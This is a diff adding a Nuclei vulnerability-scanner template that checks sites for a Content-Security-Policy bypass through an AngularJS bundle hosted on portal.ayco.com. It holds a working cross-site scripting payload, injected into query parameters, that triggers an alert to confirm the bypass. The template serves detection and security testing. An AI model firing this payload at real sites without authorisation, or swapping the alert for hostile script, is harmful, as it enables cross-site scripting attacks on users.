@@ -1,0 +1,55 @@
+id: ayco-portal-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Ayco Portal
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,ayco-portal,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "ayco.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: ayco_portal_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://portal.ayco.com/publicBundles/angularjs"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "ayco_portal_csp_xss == true"
+# digest: 4b0a00483046022100fc85d21793b69da978474318007c46b01ba24fc1c28d4c2056f959a7c307f0a9022100dfb4e0067dfc1b5c76c0d66b209750619e0fc127e1d7b10397214daaf629b2da:922c64590222798bb761d5b6d8e72950
